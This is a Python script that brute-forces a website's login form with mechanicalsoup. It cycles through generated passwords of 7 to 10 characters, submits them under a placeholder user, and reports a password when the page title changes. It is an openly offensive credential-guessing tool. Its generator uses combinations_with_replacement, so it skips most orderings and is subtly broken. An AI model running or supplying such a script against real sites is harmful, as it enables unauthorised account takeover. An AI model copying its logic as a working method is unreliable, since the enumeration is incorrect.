import mechanicalsoup
import itertools

class getironData:
    def __init__ (self , url , user ):
        self.url = url
        self.user = user
    
    def debugger(self , lfile , ldata): 
        with open (lfile , 'w') as f:
            f.write(str(ldata))

    def iterate(self , char , length ):
        gen = itertools.combinations_with_replacement(char,length) 
        for password in gen: 
            yield(''.join(password))

    def login(self , password):     
        br = mechanicalsoup.Browser()
        login = br.get(self.url)
        oldtitle = login.soup.title.text

        lform = login.soup.select("#login-form")[0]
        lform.select('#login-form-username')[0]['value'] = self.user
        lform.select('#login-form-password')[0]['value'] = password

        page2 = br.submit(lform , login.url)

        newtitle = page2.soup.title.text

        if (oldtitle == newtitle) :
            return False
        else :
            return True
        
if __name__ == '__main__' :
    url = "weburl.com"
    user = "userid"
    irmtask = getironData(url , user)
    text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()" 
    digitrange = [7,8,9,10]

    for digits in digitrange:
        for op in irmtask.iterate(text,digits):
            print("Trying " , op )
            if irmtask.login(op):
                print("The password is " , op)

    

